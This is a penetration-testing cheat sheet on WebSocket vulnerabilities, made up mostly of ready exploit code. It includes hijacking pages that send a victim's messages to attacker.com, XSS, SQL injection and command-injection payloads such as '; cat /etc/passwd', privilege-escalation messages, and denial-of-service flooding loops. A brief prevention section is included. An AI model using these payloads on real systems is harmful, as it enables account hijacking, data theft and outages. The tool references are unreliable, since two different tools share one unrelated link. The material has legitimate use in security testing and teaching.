# WebSocket Vulnerabilities

## Description
WebSockets provide full-duplex communication channels over a single TCP connection. Security vulnerabilities can arise from inadequate authentication, missing origin validation, and injection attacks through WebSocket messages.

## WebSocket Basics

### Handshake
```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://target.com
```

### Response
```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

## Vulnerability Types

### 1. Cross-Site WebSocket Hijacking (CSWSH)

If WebSocket handshake lacks CSRF protection, attackers can hijack authenticated connections.

**Vulnerable Pattern:**
- Handshake relies only on cookies
- No Origin header validation
- No CSRF token required

**Exploit:**
```html
<!DOCTYPE html>
<html>
<body>
<script>
    // Connect to victim's WebSocket
    var ws = new WebSocket('wss://vulnerable.target.com/ws');

    ws.onopen = function() {
        // Send command as victim
        ws.send('{"action": "get_messages"}');
    };

    ws.onmessage = function(event) {
        // Exfiltrate data
        fetch('https://attacker.com/collect?data=' +
              encodeURIComponent(event.data));
    };
</script>
</body>
</html>
```

### 2. Injection Attacks

#### XSS via WebSocket
```javascript
// If messages are rendered without sanitization
ws.send('<img src=x onerror=alert(document.domain)>');
ws.send('<script>alert(1)</script>');
```

#### SQL Injection via WebSocket
```javascript
ws.send('{"user": "\' OR 1=1--"}');
ws.send('{"query": "SELECT * FROM users WHERE id=\' UNION SELECT password FROM admin--"}');
```

#### Command Injection
```javascript
ws.send('{"command": "; cat /etc/passwd"}');
ws.send('{"filename": "test.txt; whoami"}');
```

### 3. Authentication Issues

```javascript
// No authentication after handshake
ws.send('{"action": "admin_delete_user", "user_id": "123"}');

// Weak token validation
ws.send('{"token": "guessable_token", "action": "get_secrets"}');
```

### 4. Authorization Bypass

```javascript
// Access other users' data
ws.send('{"action": "get_messages", "user_id": "victim_id"}');

// Escalate privileges
ws.send('{"action": "set_role", "role": "admin"}');
```

### 5. Denial of Service

```javascript
// Message flooding
for (let i = 0; i < 100000; i++) {
    ws.send('spam message ' + i);
}

// Large message
ws.send('A'.repeat(10000000));

// Many connections
for (let i = 0; i < 1000; i++) {
    new WebSocket('wss://target.com/ws');
}
```

## Testing Methodology

### 1. Intercept WebSocket Traffic

**Burp Suite:**
```
1. Enable WebSocket interception
2. Capture handshake and messages
3. Analyze message format
4. Test modifications
```

### 2. Test CSWSH

```html
<!-- Host on attacker server -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
    // If this receives data, CSWSH is possible
    console.log(e.data);
    // Exfiltrate
    new Image().src = 'https://attacker.com/log?data=' + btoa(e.data);
};
</script>
```

### 3. Test Origin Validation

```python
import websocket

# Try with different Origin headers
ws = websocket.create_connection(
    'wss://target.com/ws',
    header=['Origin: https://attacker.com']
)
# If connected, Origin not validated
```

### 4. Test Message Injection

```javascript
// Test for XSS
ws.send('<script>alert(1)</script>');

// Test for SQLi
ws.send("' OR '1'='1");

// Test for command injection
ws.send('; id');
```

## Tools

### wsrepl
```bash
# Interactive WebSocket REPL
# https://github.com/nickmakesstuff/nickmakesstuff.github.io

wsrepl -u wss://target.com/ws
```

### ws-harness
```python
# WebSocket to HTTP proxy for Burp
# https://github.com/nickmakesstuff/nickmakesstuff.github.io

python ws-harness.py -u wss://target.com/ws
# Then point Burp to local proxy
```

### websocat
```bash
# WebSocket CLI client
websocat wss://target.com/ws

# With custom headers
websocat -H "Cookie: session=abc" wss://target.com/ws
```

### Browser DevTools
```javascript
// Monitor WebSocket in Console
// Network tab > WS filter
// Click on connection to see messages
```

## Exploitation Scripts

### Python WebSocket Client
```python
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Send malicious message
    ws.send(json.dumps({"action": "get_admin_data"}))

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    cookie="session=stolen_session",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
```

### CSWSH Exploit Page
```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<h1>WebSocket Hijacking</h1>
<div id="output"></div>
<script>
const ws = new WebSocket('wss://vulnerable.com/ws');
const output = document.getElementById('output');

ws.onopen = () => {
    output.innerHTML += '<p>Connected!</p>';
    ws.send('{"action":"list_users"}');
};

ws.onmessage = (event) => {
    output.innerHTML += `<p>Data: ${event.data}</p>`;
    // Exfiltrate
    fetch('https://attacker.com/collect', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = (error) => {
    output.innerHTML += `<p>Error: ${error}</p>`;
};
</script>
</body>
</html>
```

## Socket.IO Specific

```javascript
// Socket.IO uses WebSocket with fallback
const socket = io('https://target.com');

socket.on('connect', () => {
    // Test for vulnerabilities
    socket.emit('admin_action', {action: 'delete_all'});
});

socket.on('private_data', (data) => {
    // Exfiltrate
    fetch('https://attacker.com/collect?data=' + btoa(JSON.stringify(data)));
});
```

## Prevention

### Origin Validation
```python
# Server-side check
if request.headers.get('Origin') not in ALLOWED_ORIGINS:
    return "Forbidden", 403
```

### Authentication
```javascript
// Require token in handshake or first message
ws.send(JSON.stringify({
    type: 'auth',
    token: 'secure_jwt_token'
}));
```

### Input Validation
```python
# Validate all incoming messages
def handle_message(message):
    data = json.loads(message)
    if not validate_schema(data):
        raise ValueError("Invalid message")
    # Sanitize before processing
    sanitize(data)
```

### Rate Limiting
```python
# Limit messages per second
if user.message_count > MAX_MESSAGES_PER_SECOND:
    ws.close()
```

## Testing Checklist

- [ ] Test CSWSH (create exploit page)
- [ ] Test Origin header validation
- [ ] Test authentication requirements
- [ ] Test message injection (XSS, SQLi)
- [ ] Test authorization (IDOR, privilege escalation)
- [ ] Test rate limiting
- [ ] Test message size limits
- [ ] Test connection limits

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets
- https://portswigger.net/web-security/websockets
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
